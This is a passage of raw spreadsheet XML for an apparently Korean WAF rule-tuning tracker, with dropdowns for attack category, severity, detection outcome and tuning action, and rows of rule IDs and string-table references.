  <mergeCells count="1">
    <mergeCell ref="A1:R1"/>
  </mergeCells>
  <dataValidations>
    <dataValidation type="list" allowBlank="1" sqref="P4:P12">
      <formula1>"룰 유지,타깃 제거(예외),예외 우회,Paranoia 조정,룰 삭제,재분석"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" sqref="P13:P72">
      <formula1>"룰 유지,타깃 제거(예외),예외 우회,Paranoia 조정,룰 삭제,재분석"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" sqref="F4:F72">
      <formula1>"HIGH,MEDIUM,LOW,INFO"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" sqref="R4:R12">
      <formula1>"신규,분석중,분석완료,튜닝등록,적용,검증완료,정탐(조치불필요)"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" showErrorMessage="1" sqref="D4:D25 D27:D72">
      <formula1>"SQL Injection,XSS,파일 업/다운,DDoS,포트스캐닝"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" sqref="R13:R72">
      <formula1>"신규,분석중,분석완료,튜닝등록,적용,검증완료,정탐(조치불필요)"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" showErrorMessage="1" sqref="N4:N997">
      <formula1>"미탐,오탐,정탐"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" showErrorMessage="1" sqref="H4:H92">
      <formula1>"10.0.10.2,10.0.10.3"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" showErrorMessage="1" sqref="M4:M72">
      <formula1>"200,302"</formula1>
    </dataValidation>
    <dataValidation type="list" allowBlank="1" showErrorMessage="1" sqref="D26">
      <formula1>"SQL Injection,XSS,파일 업/다운,DDoS,포트스캐닝,Brute Force"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86"/>
    <col customWidth="1" min="2" max="3" width="13.0"/>
    <col customWidth="1" min="4" max="4" width="24.0"/>
    <col customWidth="1" min="5" max="5" width="12.29"/>
    <col customWidth="1" min="6" max="6" width="34.0"/>
    <col customWidth="1" min="7" max="7" width="32.71"/>
    <col customWidth="1" min="8" max="8" width="50.0"/>
    <col customWidth="1" min="9" max="9" width="30.0"/>
    <col customWidth="1" min="10" max="10" width="12.0"/>
    <col customWidth="1" min="11" max="11" width="11.0"/>
    <col customWidth="1" min="12" max="12" width="9.0"/>
    <col customWidth="1" min="13" max="27" width="8.71"/>
  </cols>
  <sheetData>
    <row r="1" ht="24.0" customHeight="1">
      <c r="A1" s="40" t="s">
        <v>110</v>
      </c>
    </row>
    <row r="3" ht="30.0" customHeight="1">
      <c r="A3" s="41" t="s">
        <v>111</v>
      </c>
      <c r="B3" s="42" t="s">
        <v>112</v>
      </c>
      <c r="C3" s="42" t="s">
        <v>113</v>
      </c>
      <c r="D3" s="41" t="s">
        <v>114</v>
      </c>
      <c r="E3" s="43" t="s">
        <v>115</v>
      </c>
      <c r="F3" s="41" t="s">
        <v>116</v>
      </c>
      <c r="G3" s="41" t="s">
        <v>117</v>
      </c>
      <c r="H3" s="42" t="s">
        <v>118</v>
      </c>
      <c r="I3" s="41" t="s">
        <v>119</v>
      </c>
      <c r="J3" s="41" t="s">
        <v>120</v>
      </c>
      <c r="K3" s="41" t="s">
        <v>50</v>
      </c>
      <c r="L3" s="41" t="s">
        <v>121</v>
      </c>
    </row>
    <row r="4" ht="91.5" customHeight="1">
      <c r="A4" s="44" t="s">
        <v>122</v>
      </c>
      <c r="B4" s="45" t="s">
        <v>123</v>
      </c>
      <c r="C4" s="45" t="s">
        <v>124</v>
      </c>
      <c r="D4" s="44" t="s">
        <v>125</v>
      </c>
      <c r="E4" s="45" t="s">
        <v>65</v>
      </c>
      <c r="F4" s="44" t="s">
        <v>126</v>
      </c>
      <c r="G4" s="44" t="s">
        <v>127</v>
      </c>
      <c r="H4" s="46" t="s">
        <v>128</v>
      </c>
      <c r="I4" s="44" t="s">
        <v>129</v>
      </c>
      <c r="J4" s="47">
        <v>46178.0</v>
      </c>
      <c r="K4" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L4" s="44" t="s">
        <v>131</v>
      </c>
    </row>
    <row r="5" ht="39.75" customHeight="1">
      <c r="A5" s="48" t="s">
        <v>132</v>
      </c>
      <c r="B5" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C5" s="49">
        <v>1000001.0</v>
      </c>
      <c r="D5" s="49" t="s">
        <v>134</v>
      </c>
      <c r="E5" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F5" s="49" t="s">
        <v>135</v>
      </c>
      <c r="G5" s="49" t="s">
        <v>136</v>
      </c>
      <c r="H5" s="51" t="s">
        <v>137</v>
      </c>
      <c r="I5" s="49" t="s">
        <v>138</v>
      </c>
      <c r="J5" s="47">
        <v>46178.0</v>
      </c>
      <c r="K5" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L5" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="6" ht="39.75" customHeight="1">
      <c r="A6" s="44" t="s">
        <v>140</v>
      </c>
      <c r="B6" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C6" s="49">
        <v>1000002.0</v>
      </c>
      <c r="D6" s="49" t="s">
        <v>141</v>
      </c>
      <c r="E6" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F6" s="49" t="s">
        <v>142</v>
      </c>
      <c r="G6" s="49" t="s">
        <v>143</v>
      </c>
      <c r="H6" s="51" t="s">
        <v>144</v>
      </c>
      <c r="I6" s="49" t="s">
        <v>138</v>
      </c>
      <c r="J6" s="47">
        <v>46178.0</v>
      </c>
      <c r="K6" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L6" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="7" ht="39.75" customHeight="1">
      <c r="A7" s="48" t="s">
        <v>145</v>
      </c>
      <c r="B7" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C7" s="49">
        <v>1000003.0</v>
      </c>
      <c r="D7" s="49" t="s">
        <v>146</v>
      </c>
      <c r="E7" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F7" s="49" t="s">
        <v>147</v>
      </c>
      <c r="G7" s="49" t="s">
        <v>148</v>
      </c>
      <c r="H7" s="51" t="s">
        <v>149</v>
      </c>
      <c r="I7" s="49" t="s">
        <v>150</v>
      </c>
      <c r="J7" s="47">
        <v>46178.0</v>
      </c>
      <c r="K7" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L7" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="8" ht="39.75" customHeight="1">
      <c r="A8" s="44" t="s">
        <v>151</v>
      </c>
      <c r="B8" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C8" s="49">
        <v>1000004.0</v>
      </c>
      <c r="D8" s="49" t="s">
        <v>152</v>
      </c>
      <c r="E8" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F8" s="49" t="s">
        <v>153</v>
      </c>
      <c r="G8" s="49" t="s">
        <v>154</v>
      </c>
      <c r="H8" s="51" t="s">
        <v>155</v>
      </c>
      <c r="I8" s="49" t="s">
        <v>156</v>
      </c>
      <c r="J8" s="47">
        <v>46178.0</v>
      </c>
      <c r="K8" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L8" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="9" ht="39.75" customHeight="1">
      <c r="A9" s="48" t="s">
        <v>157</v>
      </c>
      <c r="B9" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C9" s="49">
        <v>1000005.0</v>
      </c>
      <c r="D9" s="49" t="s">
        <v>158</v>
      </c>
      <c r="E9" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F9" s="49" t="s">
        <v>159</v>
      </c>
      <c r="G9" s="49" t="s">
        <v>160</v>
      </c>
      <c r="H9" s="51" t="s">
        <v>161</v>
      </c>
      <c r="I9" s="49" t="s">
        <v>162</v>
      </c>
      <c r="J9" s="47">
        <v>46178.0</v>
      </c>
      <c r="K9" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L9" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="10" ht="39.75" customHeight="1">
      <c r="A10" s="44" t="s">
        <v>163</v>
      </c>
      <c r="B10" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C10" s="49">
        <v>1000006.0</v>
      </c>
      <c r="D10" s="49" t="s">
        <v>164</v>
      </c>
      <c r="E10" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F10" s="49" t="s">
        <v>165</v>
      </c>
      <c r="G10" s="49" t="s">
        <v>166</v>
      </c>
      <c r="H10" s="51" t="s">
        <v>167</v>
      </c>
      <c r="I10" s="49" t="s">
        <v>168</v>
      </c>
      <c r="J10" s="47">
        <v>46178.0</v>
      </c>
      <c r="K10" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L10" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="11" ht="39.75" customHeight="1">
      <c r="A11" s="48" t="s">
        <v>169</v>
      </c>
      <c r="B11" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C11" s="49">
        <v>1000007.0</v>
      </c>
      <c r="D11" s="49" t="s">
        <v>170</v>
      </c>
      <c r="E11" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F11" s="49" t="s">
        <v>171</v>
      </c>
      <c r="G11" s="49" t="s">
        <v>172</v>
      </c>
      <c r="H11" s="51" t="s">
        <v>173</v>
      </c>
      <c r="I11" s="49" t="s">
        <v>174</v>
      </c>
      <c r="J11" s="47">
        <v>46178.0</v>
      </c>
      <c r="K11" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L11" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="12" ht="39.75" customHeight="1">
      <c r="A12" s="44" t="s">
        <v>175</v>
      </c>
      <c r="B12" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C12" s="49">
        <v>1000008.0</v>
      </c>
      <c r="D12" s="49" t="s">
        <v>176</v>
      </c>
      <c r="E12" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F12" s="49" t="s">
        <v>177</v>
      </c>
      <c r="G12" s="49" t="s">
        <v>178</v>
      </c>
      <c r="H12" s="51" t="s">
        <v>179</v>
      </c>
      <c r="I12" s="49" t="s">
        <v>174</v>
      </c>
      <c r="J12" s="47">
        <v>46178.0</v>
      </c>
      <c r="K12" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L12" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="13" ht="39.75" customHeight="1">
      <c r="A13" s="48" t="s">
        <v>180</v>
      </c>
      <c r="B13" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C13" s="49">
        <v>1000009.0</v>
      </c>
      <c r="D13" s="49" t="s">
        <v>181</v>
      </c>
      <c r="E13" s="50" t="s">
        <v>182</v>
      </c>
      <c r="F13" s="49" t="s">
        <v>183</v>
      </c>
      <c r="G13" s="49" t="s">
        <v>184</v>
      </c>
      <c r="H13" s="51" t="s">
        <v>185</v>
      </c>
      <c r="I13" s="49" t="s">
        <v>186</v>
      </c>
      <c r="J13" s="47">
        <v>46178.0</v>
      </c>
      <c r="K13" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L13" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="14" ht="39.75" customHeight="1">
      <c r="A14" s="44" t="s">
        <v>187</v>
      </c>
      <c r="B14" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C14" s="49">
        <v>1000010.0</v>
      </c>
      <c r="D14" s="49" t="s">
        <v>188</v>
      </c>
      <c r="E14" s="50" t="s">
        <v>182</v>
      </c>
      <c r="F14" s="49" t="s">
        <v>189</v>
      </c>
      <c r="G14" s="49" t="s">
        <v>190</v>
      </c>
      <c r="H14" s="51" t="s">
        <v>191</v>
      </c>
      <c r="I14" s="49" t="s">
        <v>192</v>
      </c>
      <c r="J14" s="47">
        <v>46178.0</v>
      </c>
      <c r="K14" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L14" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="15" ht="39.75" customHeight="1">
      <c r="A15" s="48" t="s">
        <v>193</v>
      </c>
      <c r="B15" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C15" s="49">
        <v>1000011.0</v>
      </c>
      <c r="D15" s="49" t="s">
        <v>194</v>
      </c>
      <c r="E15" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F15" s="49" t="s">
        <v>195</v>
      </c>
      <c r="G15" s="49" t="s">
        <v>196</v>
      </c>
      <c r="H15" s="51" t="s">
        <v>197</v>
      </c>
      <c r="I15" s="49" t="s">
        <v>198</v>
      </c>
      <c r="J15" s="47">
        <v>46178.0</v>
      </c>
      <c r="K15" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L15" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="16" ht="39.75" customHeight="1">
      <c r="A16" s="44" t="s">
        <v>199</v>
      </c>
      <c r="B16" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C16" s="49">
        <v>1000012.0</v>
      </c>
      <c r="D16" s="49" t="s">
        <v>200</v>
      </c>
      <c r="E16" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F16" s="49" t="s">
        <v>201</v>
      </c>
      <c r="G16" s="49" t="s">
        <v>202</v>
      </c>
      <c r="H16" s="51" t="s">
        <v>203</v>
      </c>
      <c r="I16" s="49" t="s">
        <v>198</v>
      </c>
      <c r="J16" s="47">
        <v>46178.0</v>
      </c>
      <c r="K16" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L16" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="17" ht="39.75" customHeight="1">
      <c r="A17" s="48" t="s">
        <v>204</v>
      </c>
      <c r="B17" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C17" s="49">
        <v>1000013.0</v>
      </c>
      <c r="D17" s="49" t="s">
        <v>205</v>
      </c>
      <c r="E17" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F17" s="49" t="s">
        <v>206</v>
      </c>
      <c r="G17" s="49" t="s">
        <v>207</v>
      </c>
      <c r="H17" s="51" t="s">
        <v>208</v>
      </c>
      <c r="I17" s="49" t="s">
        <v>209</v>
      </c>
      <c r="J17" s="47">
        <v>46178.0</v>
      </c>
      <c r="K17" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L17" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="18" ht="39.75" customHeight="1">
      <c r="A18" s="44" t="s">
        <v>210</v>
      </c>
      <c r="B18" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C18" s="49">
        <v>1000014.0</v>
      </c>
      <c r="D18" s="49" t="s">
        <v>211</v>
      </c>
      <c r="E18" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F18" s="49" t="s">
        <v>212</v>
      </c>
      <c r="G18" s="49" t="s">
        <v>213</v>
      </c>
      <c r="H18" s="51" t="s">
        <v>214</v>
      </c>
      <c r="I18" s="49" t="s">
        <v>215</v>
      </c>
      <c r="J18" s="47">
        <v>46178.0</v>
      </c>
      <c r="K18" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L18" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="19" ht="39.75" customHeight="1">
      <c r="A19" s="48" t="s">
        <v>216</v>
      </c>
      <c r="B19" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C19" s="49">
        <v>1000015.0</v>
      </c>
      <c r="D19" s="49" t="s">
        <v>217</v>
      </c>
      <c r="E19" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F19" s="49" t="s">
        <v>218</v>
      </c>
      <c r="G19" s="49" t="s">
        <v>219</v>
      </c>
      <c r="H19" s="51" t="s">
        <v>220</v>
      </c>
      <c r="I19" s="49" t="s">
        <v>221</v>
      </c>
      <c r="J19" s="47">
        <v>46178.0</v>
      </c>
      <c r="K19" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L19" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="20" ht="39.75" customHeight="1">
      <c r="A20" s="44" t="s">
        <v>222</v>
      </c>
      <c r="B20" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C20" s="49">
        <v>1000016.0</v>
      </c>
      <c r="D20" s="49" t="s">
        <v>223</v>
      </c>
      <c r="E20" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F20" s="49" t="s">
        <v>224</v>
      </c>
      <c r="G20" s="49" t="s">
        <v>225</v>
      </c>
      <c r="H20" s="51" t="s">
        <v>226</v>
      </c>
      <c r="I20" s="49" t="s">
        <v>221</v>
      </c>
      <c r="J20" s="47">
        <v>46178.0</v>
      </c>
      <c r="K20" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L20" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="21" ht="39.75" customHeight="1">
      <c r="A21" s="48" t="s">
        <v>227</v>
      </c>
      <c r="B21" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C21" s="49">
        <v>1000017.0</v>
      </c>
      <c r="D21" s="49" t="s">
        <v>228</v>
      </c>
      <c r="E21" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F21" s="49" t="s">
        <v>229</v>
      </c>
      <c r="G21" s="49" t="s">
        <v>230</v>
      </c>
      <c r="H21" s="51" t="s">
        <v>231</v>
      </c>
      <c r="I21" s="49" t="s">
        <v>232</v>
      </c>
      <c r="J21" s="47">
        <v>46178.0</v>
      </c>
      <c r="K21" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L21" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="22" ht="39.75" customHeight="1">
      <c r="A22" s="44" t="s">
        <v>233</v>
      </c>
      <c r="B22" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C22" s="49">
        <v>1000018.0</v>
      </c>
      <c r="D22" s="49" t="s">
        <v>234</v>
      </c>
      <c r="E22" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F22" s="49" t="s">
        <v>235</v>
      </c>
      <c r="G22" s="49" t="s">
        <v>236</v>
      </c>
      <c r="H22" s="51" t="s">
        <v>237</v>
      </c>
      <c r="I22" s="49" t="s">
        <v>232</v>
      </c>
      <c r="J22" s="47">
        <v>46178.0</v>
      </c>
      <c r="K22" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L22" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="23" ht="39.75" customHeight="1">
      <c r="A23" s="48" t="s">
        <v>238</v>
      </c>
      <c r="B23" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C23" s="49">
        <v>1000019.0</v>
      </c>
      <c r="D23" s="49" t="s">
        <v>239</v>
      </c>
      <c r="E23" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F23" s="49" t="s">
        <v>240</v>
      </c>
      <c r="G23" s="49" t="s">
        <v>241</v>
      </c>
      <c r="H23" s="51" t="s">
        <v>242</v>
      </c>
      <c r="I23" s="49" t="s">
        <v>243</v>
      </c>
      <c r="J23" s="47">
        <v>46178.0</v>
      </c>
      <c r="K23" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L23" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="24" ht="39.75" customHeight="1">
      <c r="A24" s="44" t="s">
        <v>244</v>
      </c>
      <c r="B24" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C24" s="49">
        <v>1000020.0</v>
      </c>
      <c r="D24" s="49" t="s">
        <v>245</v>
      </c>
      <c r="E24" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F24" s="49" t="s">
        <v>246</v>
      </c>
      <c r="G24" s="49" t="s">
        <v>247</v>
      </c>
      <c r="H24" s="51" t="s">
        <v>248</v>
      </c>
      <c r="I24" s="49" t="s">
        <v>243</v>
      </c>
      <c r="J24" s="47">
        <v>46178.0</v>
      </c>
      <c r="K24" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L24" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="25" ht="15.75" customHeight="1">
      <c r="A25" s="48" t="s">
        <v>249</v>
      </c>
      <c r="B25" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C25" s="49">
        <v>1000021.0</v>
      </c>
      <c r="D25" s="49" t="s">
        <v>250</v>
      </c>
      <c r="E25" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F25" s="49" t="s">
        <v>251</v>
      </c>
      <c r="G25" s="49" t="s">
        <v>252</v>
      </c>
      <c r="H25" s="51" t="s">
        <v>253</v>
      </c>
      <c r="I25" s="49" t="s">
        <v>254</v>
      </c>
      <c r="J25" s="47">
        <v>46178.0</v>
      </c>
      <c r="K25" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L25" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="26" ht="15.75" customHeight="1">
      <c r="A26" s="44" t="s">
        <v>255</v>
      </c>
      <c r="B26" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C26" s="49">
        <v>1000022.0</v>
      </c>
      <c r="D26" s="49" t="s">
        <v>256</v>
      </c>
      <c r="E26" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F26" s="49" t="s">
        <v>257</v>
      </c>
      <c r="G26" s="49" t="s">
        <v>258</v>
      </c>
      <c r="H26" s="51" t="s">
        <v>259</v>
      </c>
      <c r="I26" s="49" t="s">
        <v>254</v>
      </c>
      <c r="J26" s="47">
        <v>46178.0</v>
      </c>
      <c r="K26" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L26" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="27" ht="15.75" customHeight="1">
      <c r="A27" s="48" t="s">
        <v>260</v>
      </c>
      <c r="B27" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C27" s="49">
        <v>1000023.0</v>
      </c>
      <c r="D27" s="49" t="s">
        <v>261</v>
      </c>
      <c r="E27" s="50" t="s">
        <v>182</v>
      </c>
      <c r="F27" s="49" t="s">
        <v>262</v>
      </c>
      <c r="G27" s="49" t="s">
        <v>263</v>
      </c>
      <c r="H27" s="51" t="s">
        <v>264</v>
      </c>
      <c r="I27" s="49" t="s">
        <v>265</v>
      </c>
      <c r="J27" s="47">
        <v>46178.0</v>
      </c>
      <c r="K27" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L27" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="28" ht="15.75" customHeight="1">
      <c r="A28" s="44" t="s">
        <v>266</v>
      </c>
      <c r="B28" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C28" s="49">
        <v>1000024.0</v>
      </c>
      <c r="D28" s="49" t="s">
        <v>267</v>
      </c>
      <c r="E28" s="50" t="s">
        <v>182</v>
      </c>
      <c r="F28" s="49" t="s">
        <v>268</v>
      </c>
      <c r="G28" s="49" t="s">
        <v>269</v>
      </c>
      <c r="H28" s="51" t="s">
        <v>270</v>
      </c>
      <c r="I28" s="49" t="s">
        <v>271</v>
      </c>
      <c r="J28" s="47">
        <v>46178.0</v>
      </c>
      <c r="K28" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L28" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="29" ht="15.75" customHeight="1">
      <c r="A29" s="48" t="s">
        <v>272</v>
      </c>
      <c r="B29" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C29" s="49">
        <v>1001001.0</v>
      </c>
      <c r="D29" s="49" t="s">
        <v>273</v>
      </c>
      <c r="E29" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F29" s="49" t="s">
        <v>274</v>
      </c>
      <c r="G29" s="49" t="s">
        <v>275</v>
      </c>
      <c r="H29" s="51" t="s">
        <v>276</v>
      </c>
      <c r="I29" s="49"/>
      <c r="J29" s="47">
        <v>46178.0</v>
      </c>
      <c r="K29" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L29" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="30" ht="15.75" customHeight="1">
      <c r="A30" s="44" t="s">
        <v>277</v>
      </c>
      <c r="B30" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C30" s="49">
        <v>1001002.0</v>
      </c>
      <c r="D30" s="49" t="s">
        <v>278</v>
      </c>
      <c r="E30" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F30" s="49" t="s">
        <v>279</v>
      </c>
      <c r="G30" s="49" t="s">
        <v>280</v>
      </c>
      <c r="H30" s="51" t="s">
        <v>281</v>
      </c>
      <c r="I30" s="49" t="s">
        <v>282</v>
      </c>
      <c r="J30" s="47">
        <v>46178.0</v>
      </c>
      <c r="K30" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L30" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="31" ht="15.75" customHeight="1">
      <c r="A31" s="48" t="s">
        <v>283</v>
      </c>
      <c r="B31" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C31" s="49">
        <v>1001003.0</v>
      </c>
      <c r="D31" s="49" t="s">
        <v>284</v>
      </c>
      <c r="E31" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F31" s="49" t="s">
        <v>285</v>
      </c>
      <c r="G31" s="49" t="s">
        <v>286</v>
      </c>
      <c r="H31" s="51" t="s">
        <v>287</v>
      </c>
      <c r="I31" s="49" t="s">
        <v>282</v>
      </c>
      <c r="J31" s="47">
        <v>46178.0</v>
      </c>
      <c r="K31" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L31" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="32" ht="15.75" customHeight="1">
      <c r="A32" s="44" t="s">
        <v>288</v>
      </c>
      <c r="B32" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C32" s="49">
        <v>1001004.0</v>
      </c>
      <c r="D32" s="49" t="s">
        <v>289</v>
      </c>
      <c r="E32" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F32" s="49" t="s">
        <v>290</v>
      </c>
      <c r="G32" s="49" t="s">
        <v>291</v>
      </c>
      <c r="H32" s="51" t="s">
        <v>292</v>
      </c>
      <c r="I32" s="49" t="s">
        <v>293</v>
      </c>
      <c r="J32" s="47">
        <v>46178.0</v>
      </c>
      <c r="K32" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L32" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="33" ht="15.75" customHeight="1">
      <c r="A33" s="48" t="s">
        <v>294</v>
      </c>
      <c r="B33" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C33" s="49">
        <v>1001005.0</v>
      </c>
      <c r="D33" s="49" t="s">
        <v>295</v>
      </c>
      <c r="E33" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F33" s="49" t="s">
        <v>296</v>
      </c>
      <c r="G33" s="49" t="s">
        <v>297</v>
      </c>
      <c r="H33" s="51" t="s">
        <v>298</v>
      </c>
      <c r="I33" s="49" t="s">
        <v>293</v>
      </c>
      <c r="J33" s="47">
        <v>46178.0</v>
      </c>
      <c r="K33" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L33" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="34" ht="15.75" customHeight="1">
      <c r="A34" s="44" t="s">
        <v>299</v>
      </c>
      <c r="B34" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C34" s="49">
        <v>1001006.0</v>
      </c>
      <c r="D34" s="49" t="s">
        <v>300</v>
      </c>
      <c r="E34" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F34" s="49" t="s">
        <v>301</v>
      </c>
      <c r="G34" s="49" t="s">
        <v>302</v>
      </c>
      <c r="H34" s="51" t="s">
        <v>303</v>
      </c>
      <c r="I34" s="49" t="s">
        <v>304</v>
      </c>
      <c r="J34" s="47">
        <v>46178.0</v>
      </c>
      <c r="K34" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L34" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="35" ht="15.75" customHeight="1">
      <c r="A35" s="48" t="s">
        <v>305</v>
      </c>
      <c r="B35" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C35" s="49">
        <v>1001007.0</v>
      </c>
      <c r="D35" s="49" t="s">
        <v>306</v>
      </c>
      <c r="E35" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F35" s="49" t="s">
        <v>307</v>
      </c>
      <c r="G35" s="49" t="s">
        <v>308</v>
      </c>
      <c r="H35" s="51" t="s">
        <v>309</v>
      </c>
      <c r="I35" s="49" t="s">
        <v>304</v>
      </c>
      <c r="J35" s="47">
        <v>46178.0</v>
      </c>
      <c r="K35" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L35" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="36" ht="15.75" customHeight="1">
      <c r="A36" s="44" t="s">
        <v>310</v>
      </c>
      <c r="B36" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C36" s="49">
        <v>1001008.0</v>
      </c>
      <c r="D36" s="49" t="s">
        <v>311</v>
      </c>
      <c r="E36" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F36" s="49" t="s">
        <v>312</v>
      </c>
      <c r="G36" s="49" t="s">
        <v>313</v>
      </c>
      <c r="H36" s="51" t="s">
        <v>314</v>
      </c>
      <c r="I36" s="49" t="s">
        <v>315</v>
      </c>
      <c r="J36" s="47">
        <v>46178.0</v>
      </c>
      <c r="K36" s="44" t="s">
        <v>130</v>
      </c>
      <c r="L36" s="52" t="s">
        <v>139</v>
      </c>
    </row>
    <row r="37" ht="15.75" customHeight="1">
      <c r="A37" s="48" t="s">
        <v>316</v>
      </c>
      <c r="B37" s="49" t="s">
        <v>133</v>
      </c>
      <c r="C37" s="49">
        <v>1001009.0</v>
      </c>
      <c r="D37" s="49" t="s">
        <v>317</v>
      </c>
      <c r="E37" s="50" t="s">
        <v>65</v>
      </c>
      <c r="F37" s="49" t="s">
        <v>318</v>
      </c>
